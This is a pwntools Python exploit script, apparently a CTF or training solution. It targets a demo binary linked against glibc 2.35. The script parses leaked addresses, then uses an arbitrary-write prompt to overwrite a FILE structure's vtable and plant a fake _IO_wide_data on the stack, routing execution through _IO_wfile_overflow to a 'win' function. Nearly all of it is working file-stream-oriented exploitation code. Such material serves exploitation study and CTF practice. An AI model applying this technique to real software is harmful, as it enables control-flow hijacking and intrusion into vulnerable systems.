#!/usr/bin/env python3

from pwn import *

exe = ELF("./demo1_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
gdbscript = '''
b *fwrite+179
c
dir glibc-2.35/libio
b *_IO_wdoallocbuf

'''

def conn():
    if args.LOCAL:
        # r = gdb.debug([exe.path], gdbscript)
        r = process([exe.path])
        # if args.DEBUG:
        #     gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def write(r, target, value):
    r.sendlineafter(b'Do you want to write again? (y/n): ', b'y')
    r.sendlineafter(b"Enter an address to write to: ", hex(target).encode())
    r.sendlineafter(b"Enter a value to write: ", hex(value).encode())
    
def main():
    r = conn()
    # leak code base
    r.recvuntil(b'win func is located at: ')
    win = r.recvline()
    win = int(win, 16)
    
    # leak libc base
    r.recvuntil(b'puts is located at: ')
    puts = r.recvline()
    puts = int(puts, 16)
    libc_base = puts - libc.symbols['puts']
    libc.address = libc_base
    
    
    # leak stack
    r.recvuntil(b'Reading into stack buff located at: ')
    stack_leak = r.recvline()
    stack_leak = int(stack_leak, 16)
    
    # file pointer address
    r.recvuntil(b'File pointer: ')
    file_ptr = r.recvline()
    file_ptr = int(file_ptr, 16)
    
    # IO_wfile_overflow address 
    _IO_wfile_overflow = libc.symbols['_IO_wfile_overflow']
    
    # overwrite vtable so that it will call _IO_wfile_overflow
    target = file_ptr + 0xd8
    value =libc.address + 0x216fe0
    r.sendlineafter(b"Enter an address to write to: ", hex(target).encode())
    r.sendlineafter(b"Enter a value to write: ", hex(value).encode())
    
    target = file_ptr + 0xa0
    fake_IO_wide_data = stack_leak + 0x20
    write(r, target, fake_IO_wide_data)
    
    
    target = stack_leak + 0x38
    value = 0
    write(r, target, value)
    
    target = stack_leak + 0x50
    value = 0
    write(r, target, value)
    
    target = stack_leak + 0x20 + 0xe0
    value = stack_leak
    write(r, target, value)
    
    target = stack_leak + 0x68
    value = win
    write(r, target, value)
    r.sendlineafter(b'Do you want to write again? (y/n): ', b'n')
    # offset = 0xe0
    # fake_IO_wide_data = 
    # overwrite stack buf
    # payload = b'A'*0x20 
    # payload += b'a' *0xe0
    # payload += p64(win)
    # r.sendlineafter(b'Enter to stack buffer: ', payload)
    
    
    # good luck pwning :)
    
    log.info(f"win: {hex(win)}")
    log.info(f"libc base: {hex(libc_base)}")
    log.info(f"stack leak: {hex(stack_leak)}")
    log.info(f"file pointer: {hex(file_ptr)}")
    log.info(f"_IO_wfile_overflow: {hex(_IO_wfile_overflow)}")
    log.info(f"fake_IO_wide_data: {hex(fake_IO_wide_data)}")
    
    
    
    
    
    
    r.interactive()


if __name__ == "__main__":
    main()
